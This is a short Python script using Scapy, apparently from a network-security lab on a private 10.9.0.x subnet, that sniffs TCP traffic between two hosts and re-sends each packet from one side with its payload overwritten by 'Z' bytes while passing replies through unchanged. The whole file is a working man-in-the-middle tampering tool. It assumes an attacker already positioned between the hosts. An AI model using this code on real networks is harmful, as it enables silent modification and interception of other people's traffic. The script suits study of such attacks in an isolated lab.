#!/usr/bin/env python3
from scapy.all import *

# Define IP addresses and MAC addresses
IP_SRC = "10.9.0.5"
MAC_SRC = "02:42:0a:09:00:05"
IP_DST = "10.9.0.6"
MAC_DST = "02:42:0a:09:00:06"

def inject_Zs(packet):
    # Check if the packet is from source to destination
    if packet.haslayer(IP) and packet[IP].src == IP_SRC and packet[IP].dst == IP_DST:
        # Create a new packet based on the captured one
        new_packet = IP(bytes(packet[IP]))

        # Delete checksums in IP and TCP headers
        del new_packet[IP].chksum
        del new_packet[TCP].chksum

        # Delete the original TCP payload
        del new_packet[TCP].payload

        # Construct the new payload based on the old payload
        if packet[TCP].payload:
            new_payload = b'Z' * len(packet[TCP].payload)
            send(new_packet/new_payload)
        else:
            send(new_packet)
    # Check if the packet is from destination to source
    elif packet.haslayer(IP) and packet[IP].src == IP_DST and packet[IP].dst == IP_SRC:
        # Create a new packet based on the captured one
        new_packet = IP(bytes(packet[IP]))

        # Delete checksums in IP and TCP headers
        del new_packet[IP].chksum
        del new_packet[TCP].chksum

        # Send the new packet without any modification
        send(new_packet)

# Set the packet filter to capture TCP packets
packet_filter = 'tcp'

# Start capturing packets on the eth0 interface and pass them to the inject_Zs function
sniff(iface='eth0', filter=packet_filter, prn=inject_Zs)
